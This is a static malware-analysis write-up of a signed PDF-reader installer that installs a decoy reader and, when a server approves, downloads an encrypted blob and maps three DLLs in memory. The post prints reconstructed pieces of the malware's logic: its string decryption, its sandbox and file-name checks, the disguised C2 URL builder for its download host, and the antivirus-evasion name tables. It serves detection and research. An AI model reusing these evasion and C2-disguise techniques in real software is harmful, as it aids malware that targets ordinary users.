---
title: "FrauPDF's installer checks its own file name before it asks for a payload"
date: 2026-11-14
slug: "fraupdf-installer"
description: "A signed .NET installer for a PDF reader I found no write-up for: the decoy it installs, the four-step check it runs first (security products, file name, a server's digit-parity answer), the URL scheme that disguises tokens as version fields, the uid that hides an antivirus bitmask, and the three-stage in-memory DLL chain it maps from the server's reply."
tags: ["fraupdf", "dotnet", "loader", "malvertising-lure", "string-decryption", "config-extraction", "windows"]
sample:
  family: "FrauPDF installer (unnamed)"
  sha256: "ecaa3ca51c1e9ec0f81a167909999af9f808515e3c35587955e61c228939aeb0"
  source: "[MalwareBazaar](https://bazaar.abuse.ch/sample/ecaa3ca51c1e9ec0f81a167909999af9f808515e3c35587955e61c228939aeb0/)"
toc: true
---

`AppPDF_593771.exe` installs a real PDF and EPUB reader called FrauPDF, but before it does, it decides whether the machine deserves something else. It quits on sight of ESET, Kaspersky, Sandboxie or Frida, keeps going only if its own file name still ends in something like `_593771`, and then asks `thepdfsoftsetup[.]com` for a number. If the digits of the answer add up to a non-zero even sum, it downloads a blob and maps a 32-bit DLL from it in memory, which produces a second DLL, which produces a third. When the server says no, or the file has been renamed, it installs the reader and nothing else.

The file was the newest entry under MalwareBazaar's `Dotnet` tag when I looked on November 14, 2026. It was submitted on November 12, and the submitter tagged it `TamperedChef` among other things. None of the vendor entries on the page names a family: Intezer says "unknown", ReversingLabs counts 1 of 36 scanners, Triage scores it 3 out of 10. One of the page's automatically generated YARA hits is called `WIN_Malware_XWorm_ForgeAuto_6b06c990_Extrait`; I found nothing XWorm-like in the installer. I found no public write-up for FrauPDF, "The PDF Soft" or the domain. I read it statically (ILSpy, NETReactorSlayer, dnfile and IL listings; nothing was run).

## What I found

- The installer's strings sit behind two layers. One is a per-byte XOR, `b ^ ((i * 37 + 107) & 0xFF)`. The other is a resource encrypted in the Babel Obfuscator style: an XOR'd header, DES-CBC, then a Deflate variant whose stored-block lengths are XOR'd with `0xF112`. Neither NETReactorSlayer nor de4dot decodes it. All 241 strings decode statically.
- The four C2 URLs use one host and fake version parameters (`ver`, `chan`, `lang`, `arch`, `build`). Their values are a hard-coded 16-hex token split into 4+3+3+3+3 characters, one token per step: gate, beacon, download, finish.
- The `uid` sent with the download is 8 hex characters. The last 4 encode a bitmask of the security products running on the host, XOR'd with the first 4 and with two slices of the download token, so the server can undo it.
- The installer keeps only the first quarter of the downloaded blob. It XORs that quarter with a fixed keystream from a shift register seeded with `0x95000000`, reads a size at offset 64 and a DLL at offset 68. A 32-byte constant gets XOR'd in and back out on the way and has no effect.
- The DLL's `cx1` export turns the full blob into a second DLL, whose `ac` export makes a third, whose `dc` export runs. The parameter names survive in metadata: `filepath`, `serverResponse`, `sslNumber`, `secretCount`, `bannerHwnd`, `strWrapperClass`.

## Triage: a signed setup with a broken signature

| Field | Value |
|---|---|
| SHA-256 | `ecaa3ca51c1e9ec0f81a167909999af9f808515e3c35587955e61c228939aeb0` |
| Type | PE32 .NET Framework 4.8 GUI, 2,820,232 bytes, CLR flags `0x3` (IL only, 32-bit required) |
| Protector (DIE) | .NET Reactor 6.x, control flow and anti-ILDASM |
| Version info | `FrauPDF Setup` 6.4.2.8, "The PDF Soft", `FrauPDF.Inst.exe` |
| PE timestamp | 2026-11-03 10:28:08 UTC |
| Authenticode | GlobalSign EV code signing, leaf serial `5231870f44396fa132602d23`, valid 2026-06-15 to 2027-06-16 |

The certificate was issued to a Wyoming-registered LLC. It doesn't cover this file. LIEF reports `BAD_DIGEST|BAD_SIGNATURE`, and the file's Authenticode hash is `5835f713…` while the signed digest is `9c8376e3…`. Either the signature was copied from another file or the file was changed after signing; I can't tell which from this one sample. Windows will show it as signed but invalid. I'm not naming the company: the certificate says who bought it, not who wrote the code.

Two manifest resources stand out. `FrauPDF.Inst.x0pack` (1,904,981 bytes) is a plain ZIP holding one `fraupdf.exe`. `FrauPDF.Inst.r0bin` (27,648 bytes) is a plain .NET PE. Among the rest (an ILRepack list and a few empty `.resources`), one called `oNNFP`, 2,659 bytes long, looks like noise.

## The reader is real

`fraupdf.exe` (3,831,808 bytes, x64) is a Tauri 2 application: Rust with WebView2. Its strings carry Cargo registry paths for `tauri-2.11.5`, `wry`, `tokio-1.53.1` and `rfd-0.16.0`, plus UI text like "This preview opens PDF and EPUB files." Its URLs are WebView2 boilerplate and the Brotli dictionary; I found no host of its own. The ZIP entry is dated 2026-11-01 14:16:22 and the PE timestamp says 11:16:22 UTC the same day.

`r0bin` is `FrauPDF.Remove.exe`, an uninstaller of about 700 decompiled lines that deletes the install folder, the shortcuts and the `HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\FrauPDF` key. The installer writes it into the install folder as `Uninstall.exe`.

So the installer does install a working reader into `%LOCALAPPDATA%\Programs\FrauPDF\`, with desktop and Start menu shortcuts and an uninstall entry. That is the decoy, and on most paths it is the only thing that happens.

## Getting the strings back

NETReactorSlayer flattened most of the control flow back into readable C#, resolved 4,989 constant expressions and then reported "Couldn't find any encrypted string." I took that at face value for a while. Then `Main`'s crash handler wrote its log to `Path.Combine(GetTempPath(), Class104.smethod_0(21906))`, and `Class104` was not in the decompiled project at all. ILSpy's project export had silently skipped about 50 types, including the one that matters.

There are two string schemes. The simple one covers 30 strings (UI text and resource names), the User-Agent and an export name. Each is a fixed-size blob in `<PrivateImplementationDetails>`, decoded like this:

```text
out[i] = blob[i] ^ ((i * 37 + 107) & 0xFF)
```

That gives `FrauPDF.Inst.x0pack`, `Mozilla/5.0`, `cx1`, and status lines like "Srarting setup..." (the typo is theirs).

The other scheme is a string table, and the code that reads it is built at run time. `Class104`'s static constructor opens the resource whose name decodes to `oNNFP` (`"áÀÀÈÞ"` XOR `0x8E`), passes it through `Class106.smethod_0`, and builds a method with Reflection.Emit. That method reads `BinaryReader.ReadString()` records into a `Hashtable`, keyed by `(stream position + 22) ^ 22437`, and parks the table in `AppDomain.SetData`. The emitted code sets the XOR key to 0 when `Assembly.GetEntryAssembly().FullName` contains `AssemblyServer`, `SimpleAssemblyExplorer`, `babelvm` or `smoketest`, so those tools get the wrong strings. Every `Class104.smethod_0(id)` is a lookup in that table.

`Class106` unwraps the resource:

| Offset | Size | Field | Value in this sample |
|---|---|---|---|
| 0 | 2 | header length | 37 |
| 2 | 37 | header, XOR with the next 4 bytes | |
| 39 | 4 | header XOR key | `15 ef 63 31` |
| 43 | rest | body | 2,616 bytes |

Inside the header, in order: a 7-bit-length string (`lic529D59AB`), an "encrypted" flag, a "compressed" flag, a 32-bit signature length (0), a "key present" flag, the DES key (`610099aa55b1e0aa`) and the DES IV (`02b4b9b9b8d26bac`). The body is DES-CBC with PKCS#7 padding, then compressed.

The decompressor (`Class112`) is a hand-written inflater, and it looks a lot like one I've seen in de4dot. de4dot's `BabelInflater` reads a 4-bit block header (1 bit "final", 3 bits type) and XORs stored-block lengths with a magic value. This one does the same with different numbers: type 3 is stored, 2 is fixed Huffman, 4 is dynamic Huffman, and the magic is `0xF112`. There's no `NLEN`. The tables are standard Deflate. This resource happens to be a single fixed-Huffman block, so the stored path and its magic come from reading the code, not from the data. de4dot's Babel resource parsers also expect a different header (one flag fewer before the signature, and the IV before the key). I think this is a Babel-family string protection in a build de4dot doesn't know, layered under .NET Reactor. That's an inference from the shared design; I haven't seen the protector itself.

My first inflater died on the second back-reference: a length of 5 at a distance of 370, with 113 bytes of output. I suspected another format tweak and went back into `Class107`'s tables. The tables were standard. My distance extra-bits array wasn't: I'd written `i // 2` where Deflate needs `i // 2 - 1`, which gave every distance code from 2 upward one extra bit too many. With that fixed, the body inflates to 4,095 bytes and 241 strings, and every `Class104.smethod_0(n)` in the code resolves. A few of them:

```text
23469  thepdfsoftsetup.com
23642  https://
23638  &p5el=b0663
23594  664dc44ca345a5c2
23557  c0a188a0367d1958
23572  1e627e8ceed85007
23655  699ba4b1d99e33f3
20507  \AppData\Local\Programs\FrauPDF\
21211  Image host requires a 32-bit process.
20942  Failed to apply base relocations (delta=0x{0:X8}).
```

The left column is the ID the code passes. The last two lines are the first sign of an in-memory PE loader in what claims to be a setup program.

## Four checks before any download

`Main` hands control to a six-step pipeline (`Class59`). ILSpy produced an empty file for that class, so the rest of this section comes from IL. Each step either continues or stops with a result. A stop with 0 makes `Main` call `ExitProcess(0)`. A stop with 1 or 2 runs the normal installer. A stop with 3 runs the download branch. The first step runs the file name check and stores the result; the other five are:

1. Security products and analysis tools. It hashes every process image name, every running service name and every module in its own process, then compares the hashes with tables of known names (more on those below). Any hit on ESET, Kaspersky, Sandboxie, Frida, `analyzer.exe`, or the Kaspersky service names stops with 0. The installer exits without showing a window or installing anything.
2. Its own file name. If the stored check failed, the pipeline stops with 1 and the reader gets installed.
3. The gate request. A GET to the first URL. The reply is cut at the first whitespace and kept as a token.
4. Fingerprint. It builds the security-product bitmask described below and sets two flags: one for the token check, one for the file name check.
5. Decision. If the gate request threw an error, it stops with 2. If the token's digits sum to zero or an odd number, it stops with 2. If the file name check and the token check both passed, it stops with 3.

Here is the file name check (`Class57`), rewritten from the IL:

```python
name = strip_suffix(file_name, ".exe")
name = strip_browser_copy_suffix(name)     # "AppPDF_593771 (1)" -> "AppPDF_593771"
if len(name) < 5: return False
run = count_trailing(name, str.isalnum)    # ASCII letters and digits
if not 3 <= run <= 8: return False
return name[-run - 1] in "_-"
```

`AppPDF_593771` passes, and so does a browser's `AppPDF_593771 (1)`. A sandbox that renames the file to its hash or to `sample.exe` fails and gets the reader install. I think the number is a per-download ID stamped by the distribution site, because the check accepts any 3 to 8 letters or digits and the installer's own code never parses the value. The full path does reach the downloaded stages, as the `filepath` argument below, so they could.

The token check (`Class52.smethod_8`) looked different in the decompiler than in the IL. The C# read as if any non-digit made it fail. The IL skips non-digits, adds up the digits, fails on a sum of zero, and otherwise passes when the sum is even. Either way the server decides which downloads get a payload, and its answer says so without a recognizable word in it.

## URLs that look like version checks

All four requests go to one host. `Class51` builds the URL from a 16-character hex token:

```csharp
// Class51, flattening removed
string[] names  = { "ver", "chan", "lang", "arch", "build" };
int[]    widths = { 4, 3, 3, 3, 3 };
string q = "/?" + string.Join("&", names.Select((n, i) => n + "=" + Slice(token, i)));  // 4,3,3,3,3 chars
if (withUid) q += "&uid=" + Uid(token);                       // (1)
q += "&p5el=b0663";
return "https://" + "thepdfsoftsetup.com" + q;
```

The parameter names make each request look like an update check. The values are slices of a constant: the gate token `664dc44ca345a5c2` becomes `ver=664d&chan=c44&lang=ca3&arch=45a&build=5c2`. The full URLs are in the indicators. `Class49` picks the token per step, and `Class48` sends a GET with User-Agent `Mozilla/5.0`, the system proxy turned off (`UseProxy = false`) and an 8-second timeout:

| Step | Token | Use |
|---|---|---|
| Gate | `664dc44ca345a5c2` | reply is the parity token |
| Beacon | `c0a188a0367d1958` | sent once; if it fails, the installer exits |
| Download | `1e627e8ceed85007` | the payload blob; up to 4 tries, 1 s after the beacon, then 5, 10 and 15 s apart |
| Finish | `699ba4b1d99e33f3` | sent after 4 failed tries; the installer then exits |

Only the download request carries `uid` (1). A failed beacon or four failed downloads end the run with `ExitProcess`, so on those paths nothing gets installed at all, not even the reader.

## The uid is an antivirus report

`Class50` builds the `uid`:

```text
prefix  = first4(hex(GetTickCount() ^ ProcessId))
mask    = pad4(hex(weight))                       # weight from the product bitmask
uid     = prefix + hexdigit(mask[i] ^ token[i] ^ token[i+7] ^ prefix[i]) for i in 0..3
```

`token` is the download token `1e627e8ceed85007`. The server knows the token and receives the prefix, so it can XOR both back out and read `weight`. The weight is a 14-bit field. Bit *k* of the product bitmask adds `0x8000 >> k`.

The bitmask comes from the same hashing as step 1. The hash is 32-bit FNV-1a over the name, with ASCII upper case folded to lower case, and every stored value is XOR'd with `0xC6E39BD8`. Process names arrive with `.exe`; service names are tried bare and with `.exe` appended. I matched the tables against a list of 716 security, analysis and VM tool names. That resolved 62 of the 199 distinct hashes:

| Bit | Weight | Names that matched | Effect |
|---|---|---|---|
| 0 | 0x8000 | `ns.exe`, `nortonsecurity.exe` | reported |
| 1 | (cleared) | `ekrn.exe`, `egui.exe`, `ehttpsrv.exe`, `eguiproxy.exe` (ESET) | exit in step 1 |
| 2 | 0x2000 | Bitdefender (`bdagent.exe`, `vsserv.exe`, `epsecurityservice.exe` and 7 more), Ad-Aware, Emsisoft, F-Secure, G DATA, Tencent PC Manager | reported |
| 5 | 0x0400 | `wrsa.exe` (Webroot) | reported |
| 6 | 0x0200 | `mbamservice.exe`, `mbamtray.exe`, `mbae.exe` | reported |
| 7 | 0x0100 | `msmpeng.exe`, `mpcmdrun.exe`, services `windefend`, `wdnissvc` | reported |
| 8 | 0x0080 | `mfemms.exe`, `mfevtps.exe` | reported |
| 9 | 0x0040 | none of its 4 hashes matched | reported |
| 10 | 0x0020 | Avast and AVG (`avastsvc.exe`, `aswidsagent.exe`, `avgui.exe` and 5 more) | reported |
| 11 | 0x0010 | none of its 7 hashes matched | reported |
| 12 | 0x0008 | `python.exe`, `pythonw.exe` | reported |
| 13 | (cleared) | `avp.exe`, `avpui.exe`, `ksde.exe`, `sbiectrl.exe`, `sbiesvc.exe`, `analyzer.exe` | exit in step 1 |

Bits 1 and 13 are masked off before the weight is computed (`uint_0 &= 0xFFFFDFFD`). Step 1 already exits on those products when they show up as processes, so only a service-name match could have set them here, and it gets dropped. Four more tables feed step 1 only: Kaspersky processes (`klnagent.exe` among them) and services (`klnagent`, `kavfs`, `avp`), in-process modules (`sbiedll.dll`, `frida-agent.dll`), and one table of 6 service names I couldn't resolve. A last table lists HTTP Debugger (`httpdebuggerui.exe`, `httpdebuggersvc.exe`, `httpdebugger.exe`) and is checked only when the payload chain fails.

The Python entry is the odd one in a list of antivirus products. I think it marks analysis machines, since Python processes are rare on the home PCs a fake PDF reader targets.

## The blob: a quarter, an LFSR and a constant that cancels

If the download returns something, `Class33` checks that its last 4 bytes, as a little-endian `uint32`, equal the total length minus 4. `Class31` then unwraps it. The decompiled C# had `num3 = num2 / 4`, which I first took for decompiler noise. The IL has `ldc.i4.4; div`. Rewritten from the IL:

```python
quarter = len(blob) // 4                       # (1) only the first quarter is used
if quarter < 0x10000: fail
work = bytearray(quarter)
work[0:32]  = blob[0:32];  lfsr_xor(work[0:32])
work[32:64] = CONST32;     lfsr_xor(work[0:64])   # (2) CONST32 ^ ks ...
work[64:]   = blob[32:32 + quarter - 64]
lfsr_xor(work)                                    # ... ^ ks again: CONST32 comes back unchanged
size = u32(work[64:68])
if not 0x10000 < size < quarter - 68: fail
stage1 = work[68:68 + size]
```

`lfsr_xor` (`Class22`) is a bit-level stream cipher that ignores its input when making the keystream. The state is a 32-bit register starting at `0x95000000`. For every bit, MSB first within each byte, the feedback bit is bit 18 XOR bit 17 of the state. The state shifts right by one and takes the feedback as its new bit 31, and the data bit is XOR'd with the feedback. Every call starts from the same seed, so this is a fixed keystream, and (2) is busywork: the 32-byte constant gets XOR'd with keystream bytes 32–63 and then XOR'd back. The bytes that matter are `blob[32:]` XOR keystream bytes from offset 64.

The other three quarters of the blob aren't touched here, but the whole blob goes to the next stage.

## Three DLLs, mapped in memory

`Class17` is a MemoryModule-style PE mapper. It accepts only 32-bit DLLs (hence the 32-bit-required CLR flag). It reserves memory at the preferred base or anywhere, commits sections read-write, applies relocations, resolves imports with `LoadLibraryA` and `GetProcAddress` (by name and ordinal), sets each section's protection with `VirtualProtect`, runs TLS callbacks and calls the entry point. `Class26` drives the chain. The calls are cdecl function pointers, and the parameter names are the developer's own, preserved in the metadata:

```csharp
// Class23: export signatures, names as in the Param table
int cx1(byte* blob, uint blobLen, byte** out, uint* outLen);
int ac (byte* blob, uint blobLen, char16* filepath, byte** out, uint* outLen,
        byte* serverResponse /*1024*/, byte* sslNumber /*1024*/,
        char16* secretCount, HWND bannerHwnd, char16* strWrapperClass);
int dc (char16* wrapperPath, byte* serverResp, byte* sslNumber, HWND bannerWnd,
        char16* secretCount, HWND bannerHwnd, char16* wrapperId);
```

1. Stage 1 (from the quarter) is mapped and `cx1` gets the full blob. Its output buffer is stage 2.
2. Stage 2 is mapped and `ac` gets the full blob again, the installer's own path, two empty 1,024-byte buffers, a "secret count" string, the handle of a fake progress window, and `FrauPDF;PDF;\AppData\Local\Programs\FrauPDF\;/S`. Its output is stage 3. Judging by the names, the two buffers come back filled.
3. Stage 3 is mapped and `dc` gets the path, both filled buffers, a fresh "secret count", the window handle and the same descriptor string. The installer then hides the progress window.

`secretCount` is not a count. `Class32` writes the decimal `GetTickCount()` backwards into the even slots of a 99-character buffer and fills the odd slots with digits from a xorshift32 generator seeded from `GetTickCount64()` (42 only if that is zero). The descriptor string looks like what a later stage would need to reinstall or relaunch the "wrapper" quietly: product name, a type, the install folder and the silent switch `/S`. That reading is a guess from the names; I don't have the stages.

While all this runs, the user sees a borderless window of class `FrauPDF.FetchHud.v2` that says "Working..." and "Starting FrauPDF...", with a progress bar driven by the download. If the chain completes, the installer waits until its own visible windows are gone and calls `ExitProcess`. If a stage fails, it usually falls back to the normal installer UI and installs the reader. It exits instead when a watcher thread (`Class28`) saw a new top-level window appear during the chain, or when HTTP Debugger is running.

## A silent mode, too

With `/S` on the command line the installer skips the pipeline: it installs the reader silently under a 45-second watchdog thread (`FrauPDF.Inst.Watchdog`) and exits. The uninstaller and the descriptor string both use the same `/S`.

## What I couldn't determine

The server's half. Stages 1 to 3 exist only in the reply to the download URL, and I don't contact infrastructure, so I don't know what `cx1`, `ac` and `dc` do or what the other three quarters of the blob hold. The parameter names suggest stage 3 gets a server response and a value called `sslNumber`, but that is a name, not behavior. I also can't say what the gate server answers for which visitors, or how it uses the security-product weight.

137 of the 199 distinct hashes didn't match my name list, including all of two bitmask tables (bits 9 and 11) and the 6-entry service table in step 1. They stay unknown.

Attribution: MalwareBazaar's `TamperedChef` tag is the submitter's label. Unit 42's [TamperedChef cluster write-up](https://unit42.paloaltonetworks.com/tracking-tampered-chef-clusters/) describes the same kind of business: fake PDF and productivity tools signed with certificates obtained through shell companies and renamed existing companies. It names no FrauPDF, The PDF Soft or this domain, and the one packaging it describes in detail is different (a Neutralinojs calendar app in a 7z self-extracting archive). I don't have enough to tie this sample to any of them.

## Hunting

The [extractor](https://github.com/stateless-re/tools/tree/main/samples/ecaa3ca51c1e) prints the decoded strings, rebuilt URLs and embedded files for this installer. It also decrypts a captured download blob into stage 1 (`--blob`), decodes a `uid` into product names (`--uid`), and checks a name list against the hash tables (`--names`). It parses only.

Host:

- A process whose image name ends in `_NNNNNN.exe`, signed but with an invalid digest, writing `%LOCALAPPDATA%\Programs\FrauPDF\fraupdf.exe` and `Uninstall.exe`, and an uninstall key `HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\FrauPDF` with publisher "The PDF Soft". These are strong for this build and trivial to change in the next.
- A 32-bit .NET process that makes non-image memory executable after an HTTPS download, without loading a DLL from disk. This is the behavior that matters, and it survives a rename. On its own it is noisy (some legitimate .NET apps do JIT-like things), so pair it with the rest.
- A window class `FrauPDF.FetchHud.v2` or `FrauPDF.RibbonWizard.v2`, or a thread named `FrauPDF.Inst.Watchdog`. Strong, build-specific.
- A crash log `%TEMP%\FrauPDF.Inst.crash.txt`. Weak but cheap.

Network:

- HTTPS to `thepdfsoftsetup[.]com` with a query string of exactly `ver`, `chan`, `lang`, `arch`, `build` (4, 3, 3, 3 and 3 hex characters), optionally `uid` (8 hex), and `p5el=b0663`. The shape is a good lead even if the host changes. Requests send the bare User-Agent `Mozilla/5.0` and bypass the system proxy.
- Two GETs to the same host about a second apart, the second one carrying `uid`, answered by a large binary body whose last 4 bytes give its own length minus 4.

Static:

- A .NET installer with a manifest resource whose first two bytes are a small little-endian length, followed by a header that XOR-decodes to a short string such as `lic…` and DES parameters. Babel-style string protection uses this shape; seeing it inside a "setup" binary is unusual.
- The constants `0x95000000` and `0x60000` near a bit loop, `0xC6E39BD8` as an XOR on arrays of `uint32`, and the strings `cx1`, `ac`, `dc` as export names passed to a custom `GetProcAddress`.

## Indicators

| SHA-256 | Role |
|---|---|
| `ecaa3ca51c1e9ec0f81a167909999af9f808515e3c35587955e61c228939aeb0` | `AppPDF_593771.exe`, FrauPDF installer (.NET) |
| `de7ccf3e05aa70279da9996d414256f8bdac4a61627d73bf29e82ec26c09f33f` | `FrauPDF.Inst.x0pack` resource (ZIP) |
| `117b4f462ca1ca18b206136c63dc03a2a8af07c3c6c0271c3029f9362a524e70` | `fraupdf.exe`, decoy Tauri PDF/EPUB reader (x64) |
| `5d81f494cdf2fab9a9d10384bccdace2899fe73afa58d9be1b156f4930f5b87a` | `FrauPDF.Inst.r0bin`, `FrauPDF.Remove.exe` uninstaller (.NET) |

| Network indicator | Use |
|---|---|
| `thepdfsoftsetup[.]com` | all four requests |
| `hxxps://thepdfsoftsetup[.]com/?ver=664d&chan=c44&lang=ca3&arch=45a&build=5c2&p5el=b0663` | gate |
| `hxxps://thepdfsoftsetup[.]com/?ver=c0a1&chan=88a&lang=036&arch=7d1&build=958&p5el=b0663` | beacon |
| `hxxps://thepdfsoftsetup[.]com/?ver=1e62&chan=7e8&lang=cee&arch=d85&build=007&uid=<8 hex>&p5el=b0663` | payload download |
| `hxxps://thepdfsoftsetup[.]com/?ver=699b&chan=a4b&lang=1d9&arch=9e3&build=3f3&p5el=b0663` | finish |

| Certificate | Value |
|---|---|
| Issuer | GlobalSign GCC R45 EV CodeSigning CA 2020 |
| Leaf serial | `5231870f44396fa132602d23` |
| Leaf SHA-1 | `60bfda7f2a1a61a16a8d0480224793e1e1bd2a7e` |

## ATT&CK

| ID | Technique | How this sample does it |
|---|---|---|
| T1036.005 | Masquerading: match legitimate name or location | Poses as a PDF reader setup and installs a working reader |
| T1553.002 | Subvert trust controls: code signing | Carries an EV signature that does not match the file |
| T1027 | Obfuscated files or information | XOR and DES/Deflate-variant string tables, .NET Reactor control flow |
| T1518.001 | Software discovery: security software | Hashed process, service and module names; bitmask sent in `uid` |
| T1497 | Virtualization/sandbox evasion | Exits on Sandboxie, Frida, `analyzer.exe`; requires its download file name |
| T1071.001 | Application layer protocol: web protocols | HTTPS GETs with disguised query parameters |
| T1105 | Ingress tool transfer | Downloads the encrypted stage blob |
| T1620 | Reflective code loading | Maps three DLLs from memory with a custom PE loader |

## Ending

The installer goes to some trouble to look boring to a sandbox. It quits around the usual analysis tools, installs a real reader when renamed, and waits for a server to say yes in digits. The part it can't hide is what happens after the yes: a 32-bit setup program mapping executable code that never touched the disk. That's the behavior to alert on. The file name `AppPDF_593771.exe` is the other cheap lead, because the sample needs it to stay intact.

## Credits and further reading

- The sample was submitted to [MalwareBazaar](https://bazaar.abuse.ch/sample/ecaa3ca51c1e9ec0f81a167909999af9f808515e3c35587955e61c228939aeb0/) on 2026-11-12.
- [NETReactorSlayer](https://github.com/SychicBoy/NETReactorSlayer) by SychicBoy did the control-flow cleanup; [de4dot](https://github.com/de4dot/de4dot)'s Babel module was the reference for the inflater comparison.
- Unit 42, Joseph Ganter: [Tracking TamperedChef Clusters via Certificate and Code Reuse](https://unit42.paloaltonetworks.com/tracking-tampered-chef-clusters/) (2026-05-20), for the business model this sample resembles.
- G DATA, Karsten Hahn and Louis Sorita: [AppSuite PDF Editor backdoor analysis](https://blog.gdatasoftware.com/2025/08/38257-appsuite-pdf-editor-backdoor-analysis), an earlier fake PDF editor with a server-controlled backdoor.
